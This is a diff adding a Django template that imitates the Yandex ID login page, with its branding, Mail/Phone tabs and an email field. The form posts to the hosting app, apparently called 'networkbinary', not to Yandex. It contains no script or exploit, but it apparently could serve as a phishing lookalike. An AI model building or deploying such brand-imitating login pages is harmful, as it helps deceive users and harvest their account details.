@@ -1,0 +1,175 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" type="image/png" href="{% static 'networkbinary/images/yanlo.png' %}" />
+
+  <title>Yandex ID Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      /* margin: 0;
+      padding: 0; */
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    body {
+      background: #fff;
+      color: #000;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      text-align: center;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    /* padding:10px; */
+    height: 70vh;
+    display: flex;
+    justify-content: center;
+    justify-items: center;
+    align-items: center;
+    flex-direction: column;
+
+    }
+
+    .logo {
+      font-size: 24px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 10px;
+    }
+
+    .logo span {
+      background: #000;
+      color: #fff;
+      padding: 2px 8px;
+      border-radius: 10px;
+      font-size: 14px;
+      margin-left: 4px;
+    }
+
+    h2 {
+      font-size: 18px;
+      font-weight: 500;
+      margin-bottom: 20px;
+    }
+
+    .tabs {
+      display: flex;
+      justify-content: space-between;
+      border: 1px solid #eee;
+      border-radius: 12px;
+      margin-bottom: 12px;
+      width: 80%;
+    }
+
+    .tabs div {
+      flex: 1;
+      padding: 10px;
+      cursor: pointer;
+      border-radius: 12px;
+      width: 50%;
+    }
+
+    .tabs .active {
+      background: #f2f2f2;
+      font-weight: 500;
+    }
+
+    form > input[type="email"] {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 16px;
+      border-radius: 12px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+
+   form > button {
+      width: 100%;
+      padding: 14px;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 500;
+      border: none;
+      cursor: pointer;
+      margin-bottom: 12px;
+    }
+
+    form{
+  /* border: 2px solid black; */
+  width: 80%;
+}
+
+    .login-btn {
+      background: #1a1a1a;
+      color: #fff;
+    }
+
+    .biometric-btn {
+      background: #f2f2f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .create-id {
+      border: 1px solid #ccc;
+      background: #fff;
+    }
+
+    .social-section {
+      margin-top: 20px;
+    }
+
+    .social-section p {
+      color: #666;
+      margin-bottom: 10px;
+    }
+
+    .social-icons {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      padding: 0 20px;
+    }
+
+    .social-icons img {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      border: 1px solid #eee;
+      padding: 6px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">Yandex <span>ID</span></div>
+    <h2>Log in with Yandex ID</h2>
+
+    <div class="tabs">
+      <div class="active">Mail</div>
+      <div>Phone number</div>
+    </div>
+<form action="" method="POST">
+  {% csrf_token %}
+
+    <input type="email" value="" name="email" placeholder="Email or phone number" />
+
+    <button class="login-btn">Log in</button>
+</form>
+   
+  </div>
+</div>
+</body>
+</html>
+
